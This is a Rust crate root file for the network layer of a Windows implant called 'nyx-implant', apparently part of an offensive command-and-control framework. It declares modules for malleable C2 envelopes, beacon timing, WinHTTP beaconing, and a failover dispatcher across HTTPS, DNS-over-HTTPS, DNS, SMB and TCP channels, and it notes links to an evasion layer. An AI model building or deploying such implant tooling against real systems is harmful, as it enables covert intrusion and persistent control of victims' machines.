//! nyx-implant-net — network layer of the Windows PIC implant.
//!
//! Extracted from `nyx-implant-win` (WP-C crate split): the third layer of
//! the implant DAG (`core ← evasion ← net ← tasks ← shell`). Everything here
//! builds on [`nyx_implant_core`] (heap/resolve/config/diag) and
//! [`nyx_implant_evasion`] (`mem::mask`/`unmask` for the safe-http window) and
//! is consumed upward by the shell crate (and later by the tasks crate);
//! nothing here may depend on those higher layers.
//!
//! This crate is `#![no_std]` like the shell and the layers below; the
//! globally-unique items (`#[global_allocator]`, `#[panic_handler]`, …) stay
//! in the shell cdylib (`nyx-implant-win`).
//!
//! ## Modules
//! - [`envelopes`] — build-time-baked malleable C2 envelope shapes (this
//!   crate's build.rs resolves `NYX_PROFILE` host-side and bakes the
//!   http-post client/server Step/Terminator lists).
//! - [`timing`] — baked `timing_baseline` + bursty cadence helper (host-
//!   compilable; not Windows-gated).
//! - [`transport`] — WinHTTP POST for the beacon frame (TLS via
//!   WINHTTP_FLAG_SECURE).
//! - [`channels`] — channel-agnostic multi-transport dispatcher
//!   (https/doh/dns/smb/tcp/extc2) with runtime failover.

#![cfg_attr(not(test), no_std)]

extern crate alloc;

#[cfg(all(test, target_os = "windows"))]
pub(crate) mod testutil;

pub mod timing;

#[cfg(target_os = "windows")]
pub mod channels;
#[cfg(target_os = "windows")]
pub mod envelopes;
#[cfg(target_os = "windows")]
pub mod transport;
